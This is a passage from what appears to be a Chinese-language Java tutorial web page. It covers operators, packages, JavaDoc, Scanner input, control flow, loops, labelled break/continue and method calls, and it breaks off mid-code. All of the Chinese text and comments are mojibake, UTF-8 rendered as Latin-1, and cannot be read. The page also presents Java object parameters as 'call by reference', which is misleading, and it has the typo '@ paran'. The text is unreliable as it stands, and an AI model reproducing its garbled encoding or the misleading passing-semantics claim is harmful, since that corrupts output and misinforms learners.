<h3 id="9ã€é€»è¾‘è¿ç®—ç¬¦ã€ä½è¿ç®—ç¬¦"><a href="#9ã€é€»è¾‘è¿ç®—ç¬¦ã€ä½è¿ç®—ç¬¦" class="headerlink" title="9ã€é€»è¾‘è¿ç®—ç¬¦ã€ä½è¿ç®—ç¬¦"></a>9ã€é€»è¾‘è¿ç®—ç¬¦ã€ä½è¿ç®—ç¬¦</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&amp;&amp;   <span class="comment">// é€»è¾‘ä¸ï¼šä¸¤ä¸ªå˜é‡éƒ½ä¸ºçœŸï¼Œç»“æœæ‰ä¸ºtrue</span></span><br><span class="line">||   <span class="comment">// é€»è¾‘æˆ–ï¼šä¸¤ä¸ªå˜é‡æœ‰ä¸€ä¸ªä¸ºçœŸï¼Œåˆ™ç»“æœæ‰ä¸ºtrue</span></span><br><span class="line">!    <span class="comment">// å–åï¼šå¦‚æœæ˜¯çœŸï¼Œåˆ™å˜ä¸ºå‡ï¼›å¦‚æœæ˜¯å‡ï¼Œåˆ™å˜ä¸ºçœŸ</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        A = 0011 1100</span></span><br><span class="line"><span class="comment">        B = 0000 1101</span></span><br><span class="line"><span class="comment">----------------------------------</span></span><br><span class="line"><span class="comment">        A&amp;B = 0000 1100</span></span><br><span class="line"><span class="comment">        A|B = 0011 1101</span></span><br><span class="line"><span class="comment">        A^B = 0011 0001</span></span><br><span class="line"><span class="comment">        ~B = 1111 0010</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        2*8 = 16</span></span><br><span class="line"><span class="comment">        &lt;&lt; *2</span></span><br><span class="line"><span class="comment">        &gt;&gt; /2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br></pre></td></tr></table></figure>

<h3 id="10ã€ä¸‰å…ƒè¿ç®—ç¬¦"><a href="#10ã€ä¸‰å…ƒè¿ç®—ç¬¦" class="headerlink" title="10ã€ä¸‰å…ƒè¿ç®—ç¬¦"></a>10ã€ä¸‰å…ƒè¿ç®—ç¬¦</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸‰å…ƒè¿ç®—ç¬¦</span></span><br><span class="line"><span class="comment">// x ï¼Ÿ y : z</span></span><br><span class="line"><span class="comment">// å¦‚æœx==true,åˆ™ç»“æœä¸ºyï¼Œå¦åˆ™ç»“æœä¸ºz</span></span><br></pre></td></tr></table></figure>

<h3 id="11ã€åŒ…æœºåˆ¶"><a href="#11ã€åŒ…æœºåˆ¶" class="headerlink" title="11ã€åŒ…æœºåˆ¶"></a>11ã€åŒ…æœºåˆ¶</h3><ul>
<li><p>ä¸ºäº†æ›´å¥½çš„ç»„ç»‡ç±»ï¼ŒJavaæä¾›äº†åŒ…æœºåˆ¶ï¼Œç”¨äºåŒºåˆ«ç±»åçš„å‘½åç©ºé—´</p>
</li>
<li><p>åŒ…è¯­å¥çš„è¯­æ³•æ ¼å¼æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[.pkg2[.pkg3â€¦â€¦]];</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸€èˆ¬åˆ©ç”¨å…¬å¸åŸŸåå€’ç½®ä½œä¸ºåŒ…åï¼›<a href="http://www.baidu.com/">www.baidu.com</a> â€”&gt;   com&#x2F;baidu&#x2F;www</p>
</li>
<li><p>ä¸ºäº†èƒ½å¤Ÿä½¿ç”¨æŸä¸ªåŒ…çš„æˆå‘˜ï¼Œæˆ‘ä»¬éœ€è¦å†Javaç¨‹åºä¸­æ˜ç¡®å¯¼å…¥è¯¥åŒ…ï¼Œä½¿ç”¨â€œimportâ€è¯­å¥å¯å®Œæˆæ­¤åŠŸèƒ½</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> package1[.package2â€¦â€¦].(classname | *);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="12ã€JavaDoc"><a href="#12ã€JavaDoc" class="headerlink" title="12ã€JavaDoc"></a>12ã€JavaDoc</h3><ul>
<li><p>JavaDocæ˜¯ç”¨æ¥ç”Ÿæˆè‡ªå·±APIæ–‡æ¡£çš„ã€‚</p>
</li>
<li><p>å‚æ•°ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- @ authorä½œè€…å</span><br><span class="line">- @ versionç‰ˆæœ¬å·</span><br><span class="line">- @ sinceæŒ‡æ˜éœ€è¦æœ€æ—©ä½¿ç”¨çš„jdkç‰ˆæœ¬</span><br><span class="line">- @ paranå‚æ•°å</span><br><span class="line">- @ returnè¿”å›å€¼æƒ…å†µ</span><br><span class="line">- @ throwså¼‚å¸¸æŠ›å‡ºæƒ…å†µ</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> Doc.java   <span class="comment">// æ³¨æ„ä¿æŒç¼–ç ä¸€è‡´</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><h3 id="1ã€ç”¨æˆ·äº¤äº’Scanner"><a href="#1ã€ç”¨æˆ·äº¤äº’Scanner" class="headerlink" title="1ã€ç”¨æˆ·äº¤äº’Scanner"></a>1ã€ç”¨æˆ·äº¤äº’Scanner</h3><ul>
<li><p>Javaç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå·¥å…·ç±»ï¼Œå»å®ç°ç¨‹åºä¸äººçš„äº¤äº’ï¼Œè·å–ç”¨æˆ·çš„è¾“å…¥ï¼Œjava.util.Scanneræ˜¯Java5çš„æ–°ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Scannerç±»å»è·å–ç”¨æˆ·è¾“å…¥ã€‚</p>
</li>
<li><p>åŸºæœ¬è¯­æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure>
</li>
<li><p>é€šè¿‡ Scannerç±»çš„next()ä¸ nextLine()æ–¹æ³•è·å–è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œåœ¨è¯»å–å‰æˆ‘ä»¬ä¸€èˆ¬éœ€è¦ä½¿ç”¨ hasNext()ä¸ hasNextLine()åˆ¤æ–­æ˜¯å¦è¿˜æœ‰è¾“å…¥çš„æ•°æ®ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;è¾“å…¥çš„å†…å®¹ä¸º:&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(scanner.hasNextLine())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;è¾“å‡ºçš„å†…å®¹ä¸º:&quot;</span> + str);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>next()ï¼š</p>
<ol>
<li>ä¸€å®šè¦è¯»å–åˆ°æœ‰æ•ˆå­—ç¬¦æ‰å¯ä»¥ç»“æŸè¾“å…¥ã€‚</li>
<li>å¯¹è¾“å…¥æœ‰æ•ˆå­—ç¬¦ä¹‹å‰é‡åˆ°çš„ç©ºç™½ï¼Œä¼šè‡ªåŠ¨å»é™¤</li>
<li>åªæœ‰è¾“å…¥æœ‰æ•ˆå­—ç¬¦æ‰å°†å…¶åè¾“å…¥çš„ç©ºç™½ä½œä¸ºåˆ†éš”ç¬¦æˆ–è€…ç»“æŸç¬¦</li>
<li>nextä¸èƒ½è·å–å¸¦ç©ºæ ¼çš„å­—ç¬¦ä¸²</li>
</ol>
</li>
<li><p>nextLine():</p>
<ol>
<li>ä»¥Enterä¸ºç»“æŸç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´è¿”å›çš„æ˜¯Enterå‰æ‰€æœ‰å­—ç¬¦</li>
<li>å¯ä»¥è·å–ç©ºç™½</li>
</ol>
</li>
</ul>
<h3 id="2ã€é¡ºåºç»“æ„"><a href="#2ã€é¡ºåºç»“æ„" class="headerlink" title="2ã€é¡ºåºç»“æ„"></a>2ã€é¡ºåºç»“æ„</h3><ul>
<li>Javaçš„åŸºæœ¬ç»“æ„å°±æ˜¯é¡ºåºç»“æ„ï¼Œé™¤éç‰¹åˆ«æŒ‡æ˜ï¼Œè´Ÿè´£å°±æ˜¯æŒ‰ç…§é¡ºåºä¸€å¥ä¸€å¥æ‰§è¡Œã€‚</li>
<li>é¡ºåºç»“æ„æ˜¯æœ€ç®€å•çš„ç®—æ³•ç»“æ„</li>
<li>è¯­å¥ä¸è¯­å¥ä¹‹é—´ï¼Œæ¡†ä¸æ¡†ä¹‹é—´æ˜¯æŒ‰ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºè¿›è¡Œçš„ï¼Œå®ƒæ˜¯ç”±è‹¥å¹²ä¸ªä¾æ¬¡æ‰§è¡Œçš„å¤„ç†æ­¥éª¤ç»„æˆçš„ï¼Œ<strong>å®ƒæ˜¯ä»»ä½•ä¸€ä¸ªç®—æ³•éƒ½ç¦»ä¸å¼€çš„ä¸€ç§åŸºæœ¬ç®—æ³•ç»“æ„</strong> ã€‚</li>
</ul>
<h3 id="3ã€é€‰æ‹©ç»“æ„"><a href="#3ã€é€‰æ‹©ç»“æ„" class="headerlink" title="3ã€é€‰æ‹©ç»“æ„"></a>3ã€é€‰æ‹©ç»“æ„</h3><ul>
<li><p>ifç®€å•é€‰æ‹©ç»“æ„</p>
<ul>
<li><p>æˆ‘ä»¬å¾ˆå¤šæ—¶å€™å»åˆ¤æ–­ä¸€ä¸ªä¸œè¥¿æ˜¯å¦å¯è¡Œï¼Œå¯è¡Œæ‰èƒ½å¤Ÿå»æ‰§è¡Œï¼Œè¿™å°±ç”¨åˆ°ifç»“æ„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>ï¼ˆå¸ƒå°”è¡¨è¾¾å¼ï¼‰&#123;</span><br><span class="line">	<span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼ä¸ºtrueæ‰æ‰§è¡Œè¿™ä¸ªä»£ç å—ä¸­çš„</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>ifåŒé€‰æ‹©ç»“æ„ï¼ˆä¹Ÿå°±æ˜¯if elseï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼ä¸ºtrue</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼å€¼ä¸ºfalse</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ifå¤šé€‰æ‹©ç»“æ„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼1ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼2ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼3ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœä»¥ä¸Šå¸ƒå°”è¡¨è¾¾å¼å€¼éƒ½ä¸ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>åµŒå¥—çš„ifç»“æ„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼1ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">	<span class="keyword">if</span>(å¸ƒå°”è¡¨è¾¾å¼<span class="number">2</span>)&#123;</span><br><span class="line">    	<span class="comment">// å¦‚æœå¸ƒå°”è¡¨è¾¾å¼2ä¸ºtrueæ‰§è¡Œä»£ç </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>switchå¤šé€‰æ‹©ç»“æ„</p>
<ul>
<li>å¤šé€‰æ‹©ç»“æ„è¿˜æœ‰ä¸€ä¸ªå®ç°æ–¹å¼å°±æ˜¯ switch caseè¯­å¥ã€‚</li>
<li>switch caseè¯­å¥åˆ¤æ–­ä¸€ä¸ªå˜é‡ä¸ä¸€ç³»åˆ—å€¼ä¸­æŸä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œæ¯ä¸ªå€¼ç§°ä¸ºä¸€ä¸ªåˆ†æ”¯ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>ï¼ˆå‚æ•°ï¼‰&#123;</span><br><span class="line">	<span class="keyword">case</span> A:</span><br><span class="line">	<span class="keyword">case</span> B:</span><br><span class="line">	<span class="keyword">case</span> C:</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4ã€å¾ªç¯ç»“æ„"><a href="#4ã€å¾ªç¯ç»“æ„" class="headerlink" title="4ã€å¾ªç¯ç»“æ„"></a>4ã€å¾ªç¯ç»“æ„</h3><ul>
<li>whileå¾ªç¯</li>
<li>doâ€¦â€¦whileå¾ªç¯</li>
<li>forå¾ªç¯</li>
</ul>
<h3 id="5ã€break-continue"><a href="#5ã€break-continue" class="headerlink" title="5ã€break &amp; continue"></a>5ã€break &amp; continue</h3><ul>
<li><p>breakåœ¨ä»»ä½•å¾ªç¯è¯­å¥çš„ä¸»ä½“éƒ¨åˆ†ï¼Œå‡å¯ç”¨ breakæ§åˆ¶å¾ªç¯çš„æµç¨‹ã€‚ <strong>breakç”¨äºå¼ºè¡Œé€€å‡ºå¾ªç¯</strong>ï¼Œä¸æ‰§è¡Œå¾ªç¯ä¸­å‰©ä½™çš„è¯­å¥ã€‚ï¼ˆ breakè¯­å¥ä¹Ÿåœ¨ switchè¯­å¥ä¸­ä½¿ç”¨ï¼‰ã€‚</p>
</li>
<li><p>continueè¯­å¥ç”¨åœ¨å¾ªç¯è¯­å¥ä½“ä¸­ï¼Œ<strong>ç”¨äºç»ˆæ­¢æŸæ¬¡å¾ªç¯è¿‡ç¨‹</strong>ï¼Œå³è·³è¿‡å¾ªç¯ä½“ä¸­å°šæœªæ‰§è¡Œçš„è¯­å¥ï¼Œæ¥ç€è¿›è¡Œä¸‹ä¸€æ¬¡æ˜¯å¦æ‰§è¡Œå¾ªç¯çš„åˆ¤å®šã€‚</p>
</li>
<li><p>å…³äºgotoæ ‡ç­¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label:</span><br><span class="line">whileï¼ˆæˆ–å…¶ä»–å¾ªç¯è¯­å¥ï¼‰</span><br></pre></td></tr></table></figure>

<ul>
<li>gotoå…³é”®å­—å¾ˆæ—©å°±åœ¨ç¨‹åºè®¾è®¡è¯­è¨€ä¸­å‡ºç°ã€‚å°½ç®¡gotoä»æ˜¯Javaçš„ä¸€ä¸ªä¿ç•™å­—ï¼Œä½†å¹¶æœªåœ¨è¯­è¨€ä¸­å¾—åˆ°æ­£å¼ä½¿ç”¨ï¼›Javaæ²¡æœ‰gotoã€‚ç„¶è€Œï¼Œåœ¨ breakiå’Œ continueè¿™ä¸¤ä¸ªå…³é”®å­—çš„èº«ä¸Šï¼Œæˆ‘ä»¬ä»ç„¶èƒ½çœ‹å‡ºä¸€äº›gotoçš„å½±å­â€”å¸¦æ ‡ç­¾çš„ breakå’Œcontinueã€‚</li>
<li>â€œæ ‡ç­¾â€æ˜¯æŒ‡åé¢è·Ÿä¸€ä¸ªå†’å·çš„æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ï¼šlabelï¼›</li>
<li>å¯¹Javaæ¥è¯´å”¯ä¸€ç”¨åˆ°æ ‡ç­¾çš„åœ°æ–¹æ˜¯åœ¨å¾ªç¯è¯­å¥ä¹‹å‰ã€‚è€Œåœ¨å¾ªç¯ä¹‹å‰è®¾ç½®æ ‡ç­¾çš„å”¯ä¸€ç†ç”±æ˜¯ï¼šæˆ‘ä»¬å¸Œæœ›åœ¨å…¶ä¸­åµŒå¥—å¦ä¸€ä¸ªå¾ªç¯ï¼Œç”±äº breakå’Œ continueå…³é”®å­—é€šå¸¸åªä¸­æ–­å½“å‰å¾ªç¯ï¼Œä½†è‹¥éšåŒæ ‡ç­¾ä½¿ç”¨ï¼Œå®ƒä»¬å°±ä¼šä¸­æ–­åˆ°å­˜åœ¨æ ‡ç­¾çš„åœ°æ–¹ã€‚</li>
<li>gotoæ ‡ç­¾ç”±äºæœ‰ä¸€äº›ä¸å¥½çš„æ–¹é¢ï¼Œä¸€èˆ¬åŸºæœ¬ä¸ä½¿ç”¨</li>
</ul>
</li>
</ul>
<h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><h3 id="1ã€ä½•è°“æ–¹æ³•"><a href="#1ã€ä½•è°“æ–¹æ³•" class="headerlink" title="1ã€ä½•è°“æ–¹æ³•"></a>1ã€ä½•è°“æ–¹æ³•</h3><ul>
<li><p>Javaæ–¹æ³•æ˜¯è¯­å¥å¾—åˆ°é›†åˆï¼Œå®ƒä»¬åœ¨ä¸€èµ·æ‰§è¡Œä¸€ä¸ªåŠŸèƒ½ã€‚</p>
<ul>
<li>æ–¹æ³•æ˜¯è§£å†³ä¸€ç±»é—®é¢˜çš„æ­¥éª¤çš„æœ‰åºç»„åˆ</li>
<li>å‘åŒ…å«äºç±»æˆ–å¯¹è±¡ä¸­</li>
<li>æ–¹æ³•åœ¨ç¨‹åºä¸­è¢«åˆ›å»ºï¼Œåœ¨å…¶ä»–åœ°æ–¹è¢«å¼•ç”¨</li>
</ul>
</li>
<li><p>è®¾è®¡æ–¹æ³•çš„åŸåˆ™ï¼šæ–¹æ³•çš„æœ¬æ„æ˜¯åŠŸèƒ½å—ï¼Œå°±æ˜¯å®ç°æŸä¸ªåŠŸèƒ½çš„è¯­å¥å—çš„é›†åˆã€‚æˆ‘ä»¬è®¾è®¡æ–¹æ³•çš„æ—¶å€™ï¼Œæœ€å¥½ä¿æŒæ–¹æ³•çš„åŸå­æ€§ï¼Œ<strong>å°±æ˜¯ä¸€ä¸ªæ–¹æ³•åªå®Œæˆ1ä¸ªåŠŸèƒ½ï¼Œè¿™æ ·åˆ©äºæˆ‘ä»¬åæœŸçš„æ‰©å±•</strong>ã€‚å¹¶ä¸”å¯¹äºæ–¹æ³•çš„å‘½åï¼Œä¹Ÿå°½å¯èƒ½å»å¯¹åº”å…¶åŠŸèƒ½ï¼Œä½¿å…¶æ›´æµ…æ˜¾æ˜“æ‡‚ã€‚</p>
</li>
</ul>
<h3 id="2ã€æ–¹æ³•çš„å®šä¹‰åŠè°ƒç”¨"><a href="#2ã€æ–¹æ³•çš„å®šä¹‰åŠè°ƒç”¨" class="headerlink" title="2ã€æ–¹æ³•çš„å®šä¹‰åŠè°ƒç”¨"></a>2ã€æ–¹æ³•çš„å®šä¹‰åŠè°ƒç”¨</h3><ul>
<li><p>Javaçš„æ–¹æ³•ç±»ä¼¼äºå…¶å®ƒè¯­è¨€çš„å‡½æ•°ï¼Œæ˜¯ä¸€æ®µ<strong>ç”¨æ¥å®Œæˆç‰¹å®šåŠŸèƒ½çš„ä»£ç ç‰‡æ®µ</strong>ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå®šä¹‰ä¸€ä¸ªæ–¹æ³•åŒ…å«ä»¥ä¸‹è¯­æ³•ï¼š</p>
</li>
<li><p><strong>æ–¹æ³•åŒ…å«ä¸€ä¸ªæ–¹æ³•å¤´å’Œä¸€ä¸ªæ–¹æ³•ä½“</strong>ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰éƒ¨åˆ†ï¼š</p>
<ul>
<li><strong>ä¿®é¥°ç¬¦</strong>ï¼šä¿®é¥°ç¬¦ï¼Œè¿™æ˜¯å¯é€‰çš„ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å¦‚ä½•è°ƒç”¨è¯¥æ–¹æ³•ã€‚å®šä¹‰äº†è¯¥æ–¹æ³•çš„è®¿é—®ç±»å‹ã€‚</li>
<li><strong>è¿”å›å€¼ç±»å‹</strong>ï¼šæ–¹æ³•å¯èƒ½ä¼šè¿”å›å€¼ã€‚ returnValueTypeæ˜¯æ–¹æ³•è¿”å›å€¼çš„æ•°æ®ç±»å‹ã€‚æœ‰äº›æ–¹æ³•æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼Œä½†æ²¡æœ‰è¿”å›å€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ returnValueTypeæ˜¯å…³é”®å­—voidã€‚</li>
<li><strong>æ–¹æ³•å</strong>ï¼šæ˜¯æ–¹æ³•çš„å®é™…åç§°ã€‚æ–¹æ³•åå’Œå‚æ•°è¡¨å…±åŒæ„æˆæ–¹æ³•ç­¾åã€‚</li>
<li><strong>å‚æ•°ç±»å‹</strong>ï¼šå‚æ•°åƒæ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚å½“æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼ é€’å€¼ç»™å‚æ•°ã€‚è¿™ä¸ªå€¼è¢«ç§°ä¸ºå®å‚æˆ–å˜é‡ã€‚å‚æ•°åˆ—è¡¨æ˜¯æŒ‡æ–¹æ³•çš„å‚æ•°ç±»å‹ã€é¡ºåºå’Œå‚æ•°çš„ä¸ªæ•°ã€‚å‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ–¹æ³•å¯ä»¥ä¸åŒ…å«ä»»ä½•å‚æ•°ã€‚<ul>
<li>å½¢å¼å‚æ•°ï¼šåœ¨æ–¹æ³•è¢«è°ƒç”¨æ—¶ç”¨äºæ¥æ”¶å¤–ç•Œè¾“å…¥çš„æ•°æ®ã€‚</li>
<li>å®å‚ï¼šè°ƒç”¨æ–¹æ³•æ—¶å®é™…ä¼ ç»™æ–¹æ³•çš„æ•°æ®ã€‚</li>
</ul>
</li>
<li><strong>æ–¹æ³•ä½“</strong>ï¼šæ–¹æ³•ä½“åŒ…å«å…·ä½“çš„è¯­å¥ï¼Œå®šä¹‰è¯¥æ–¹æ³•çš„åŠŸèƒ½ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å‚æ•°ç±»å‹ å‚æ•°å)&#123;</span><br><span class="line">    ...</span><br><span class="line">    æ–¹æ³•ä½“</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> è¿”å›å€¼;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>è°ƒç”¨æ–¹æ³•ï¼šå¯¹è±¡å.æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰</p>
</li>
<li><p>Javaæ”¯æŒä¸¤ç§è°ƒç”¨æ–¹æ³•çš„æ–¹å¼ï¼Œæ ¹æ®æ–¹æ³•æ˜¯å¦è¿”å›å€¼æ¥é€‰æ‹©ï¼Œå½“æ–¹æ³•è¿”å›ä¸€ä¸ªå€¼çš„æ—¶å€™ï¼Œæ–¹æ³•è°ƒç”¨é€šå¸¸è¢«å½“åšä¸€ä¸ªå€¼ã€‚</p>
</li>
<li><p>å¦‚æœè¿”å›å€¼ä¸ºç©ºçš„è¯ï¼Œæ–¹æ³•è°ƒç”¨ä¸€å®šæ˜¯ä¸€æ¡è¯­å¥</p>
</li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼ï¼ï¼ï¼ï¼</p>
</blockquote>
<ul>
<li>æ–¹æ³•å¯ä»¥ä¿®æ”¹<strong>ä¼ é€’å¼•ç”¨æ‰€å¯¹åº”çš„</strong>å˜é‡å€¼ï¼Œè€Œ<strong>ä¸èƒ½ä¿®æ”¹ä¼ é€’å€¼è°ƒç”¨</strong>æ‰€å¯¹åº”çš„å˜é‡å€¼ï¼Œè¿™å¥è¯ç›¸å½“é‡è¦ï¼Œè¿™æ˜¯æŒ‰å€¼è°ƒç”¨ä¸å¼•ç”¨è°ƒç”¨çš„æ ¹æœ¬åŒºåˆ«ï¼Œä»¥ä¸‹ä¸ºåˆ†æï¼š</li>
<li>æŒ‰å€¼è°ƒç”¨(call by value)è¡¨ç¤ºæ–¹æ³•æ¥å—çš„æ—¶è°ƒç”¨è€…<strong>æä¾›çš„å€¼</strong>ã€‚</li>
</ul>
<p>å‡½æ•°ä¼ é€’å€¼æµç¨‹å›¾</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/c9ac44a4a04ebd2fd63b7df7de2f2d66--9e4a--image-20240916195454929.png" alt="image-20240916195454929"></p>
<p><strong>åˆ†æ</strong>ï¼š</p>
<ul>
<li>1ï¼‰valueè¢«åˆå§‹åŒ–ä¸ºxå€¼çš„ä¸€ä¸ªæ‹·è´ï¼ˆä¹Ÿå°±æ˜¯10ï¼‰</li>
<li>2ï¼‰valueè¢«ä¹˜ä»¥3åç­‰äº30ï¼Œä½†æ³¨æ„æ­¤æ—¶xçš„å€¼ä»ä¸º10ï¼</li>
<li>3ï¼‰è¿™ä¸ªæ–¹æ³•ç»“æŸåï¼Œå‚æ•°å˜é‡valueä¸å†ä½¿ç”¨ï¼Œè¢«å›æ”¶ã€‚</li>
</ul>
<blockquote>
<p><strong>ç»“è®ºï¼š</strong>å½“ä¼ é€’æ–¹æ³•å‚æ•°ç±»å‹ä¸ºåŸºæœ¬æ•°æ®ç±»å‹ï¼ˆæ•°å­—ä»¥åŠå¸ƒå°”å€¼ï¼‰æ—¶ï¼Œä¸€ä¸ªæ–¹æ³•æ˜¯ä¸å¯èƒ½ä¿®æ”¹ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹çš„å‚æ•°ã€‚</p>
</blockquote>
<ul>
<li><p>æŒ‰å¼•ç”¨è°ƒç”¨(call by reference)</p>
</li>
<li><p>æŒ‰å¼•ç”¨è°ƒç”¨åˆ™è¡¨ç¤ºæ–¹æ³•æ¥æ”¶çš„æ˜¯<strong>è°ƒç”¨è€…æä¾›çš„å˜é‡åœ°å€</strong>(å¦‚æœæ˜¯Cè¯­è¨€çš„è¯æ¥è¯´å°±æ˜¯æŒ‡é’ˆå•¦ï¼Œå½“ç„¶javaå¹¶æ²¡æœ‰æŒ‡é’ˆçš„æ¦‚å¿µ)</p>
</li>
<li><p>å½“ç„¶javaä¸­é™¤äº†åŸºæœ¬æ•°æ®ç±»å‹è¿˜æœ‰<strong>å¼•ç”¨æ•°æ®ç±»å‹</strong>ï¼Œä¹Ÿå°±æ˜¯<strong>å¯¹è±¡å¼•ç”¨</strong>ï¼Œé‚£ä¹ˆå¯¹äºè¿™ç§æ•°æ®ç±»å‹åˆæ˜¯æ€ä¹ˆæ ·çš„æƒ…å†µå‘¢ï¼Ÿæˆ‘ä»¬è¿˜æ˜¯ä¸€æ ·å…ˆæ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š<br>å…ˆå£°æ˜ä¸€ä¸ªUserå¯¹è±¡ç±»å‹ï¼š </p>
</li>
<li><p>åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HomeWork02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">(User student)</span>&#123;</span><br><span class="line">        student.setName(<span class="string">&quot;subeiLY&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        